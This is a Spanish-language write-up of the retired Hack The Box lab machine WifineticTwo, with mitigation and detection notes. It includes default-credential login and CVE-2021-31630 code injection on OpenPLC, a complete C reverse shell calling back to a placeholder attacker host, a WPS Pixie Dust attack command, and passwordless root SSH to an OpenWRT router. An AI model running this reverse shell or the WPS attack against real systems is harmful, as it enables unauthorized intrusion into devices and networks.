---
machine: WifineticTwo
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, openplc, cve-2021-31630, wifi, wps, pixie-dust, openwrt, privesc]
---

# WifineticTwo — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

OpenPLC en 8080 acepta credenciales por defecto; el "Hardware Layer Code Box" de `/hardware` permite inyectar comandos y se usa una reverse shell en C para root en `attica01`. Desde ese contenedor se ve `wlan0` sin asociar; se escanean puntos de acceso y se hace un ataque Pixie Dust contra WPS para obtener la contraseña del AP. Tras conectarse a la red aparece un OpenWRT con LuCI; la cuenta root no tiene contraseña, así que se entra directamente por SSH como root. Desde LuCI también se puede añadir una clave pública.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,8080 <IP>
```

- `22`: OpenSSH 8.2p1 Ubuntu.
- `8080`: Werkzeug/1.0.1 sobre Python 2.7.18, OpenPLC.

```bash
echo '<IP> openplc.htb' | sudo tee -a /etc/hosts
```

## Enumeración

La interfaz de OpenPLC pide usuario y contraseña. Las credenciales por defecto `openplc` / `<PASSWORD>` permiten entrar. El panel tiene una sección `/hardware` con el "Hardware Layer Code Box", donde se pega código C que el servidor compila y ejecuta.

También se confirma la versión de OpenPLC Webserver v3, afectada por CVE-2021-31630.

## Foothold

En el code box se escribe una reverse shell en C que se conecta al host atacante. Al compilar y ejecutar, la conexión llega como root, porque el servicio corre con privilegios en el contenedor `attica01`.

```c
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
int main() {
  int s = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in a = {AF_INET, htons(<LPORT>), inet_addr("<LHOST>")};
  connect(s, (struct sockaddr *)&a, sizeof(a));
  dup2(s, 0); dup2(s, 1); dup2(s, 2);
  execl("/bin/sh", "sh", NULL);
}
```

## Movimiento lateral

El contenedor tiene una interfaz `wlan0` sin asociar y una red interna `10.0.3.0/24`. Se enumeran las interfaces y se escanean los puntos de acceso cercanos:

```bash
iwconfig wlan0
iwlist wlan0 scan
```

Aparece un AP con WPS habilitado. Se ejecuta un ataque Pixie Dust con OneShot para recuperar la contraseña WPA sin fuerza bruta.

```bash
python3 oneshot.py -i wlan0 -b <BSSID> -K
```

Con la contraseña se asocia la interfaz y se obtiene acceso a la red del AP.

## Escalada de privilegios

En la red interna aparece un OpenWRT con LuCI en `192.168.1.1`. La cuenta root no tiene contraseña, así que se entra directamente por SSH. Desde LuCI también se puede añadir una clave pública a `/etc/dropbear/authorized_keys`.

```bash
ssh root@192.168.1.1
```

## Evidencia

- OpenPLC con credenciales por defecto y `/hardware` accesible.
- Código C compilado y reverse shell como root en `attica01`.
- `wlan0` sin asociar y AP con WPS.
- Pixie Dust con la contraseña del AP recuperada.
- LuCI en `192.168.1.1` y root sin contraseña.
- `id` con UID 0 en el AP.

## Lecciones aprendidas

- Las credenciales por defecto en sistemas industriales son críticas.
- El code box de OpenPLC ejecuta C como root; es RCE directo.
- Una interfaz inalámbrica sin configurar puede dar acceso a otra red.
- WPS con Pixie Dust compromete la contraseña WPA en segundos.
- Un panel de administración sin contraseña es root inmediato.
- CVE-2021-31630 es la vulnerabilidad de OpenPLC; la 2023-31630 que a veces se cita no aplica.

## Mitigaciones y detección

- Cambiar credenciales por defecto y restringir el acceso a OpenPLC.
- Deshabilitar el code box o ejecutarlo en un entorno aislado sin root.
- Segmentar la red inalámbrica y deshabilitar WPS.
- Configurar contraseña en LuCI y deshabilitar el acceso root sin autenticación.
- Monitorizar compilaciones en `/hardware`, escaneos WPS y conexiones SSH al AP.
- Actualizar OpenPLC y revisar la CVE-2021-31630.

## Referencias

- [0xdf — WifineticTwo](https://0xdf.gitlab.io/2024/07/27/htb-wifinetictwo.html)
- [IppSec — WifineticTwo](https://www.youtube.com/watch?v=EDwHvZ6ujho)
- [Hack The Box — WifineticTwo](https://app.hackthebox.com/machines/wifinetictwo)
- [NVD — CVE-2021-31630](https://nvd.nist.gov/vuln/detail/CVE-2021-31630)
- [Knowledge — OpenPLC y CVE-2021-31630](../../../knowledge/linux/openplc-cve-2021-31630.md)
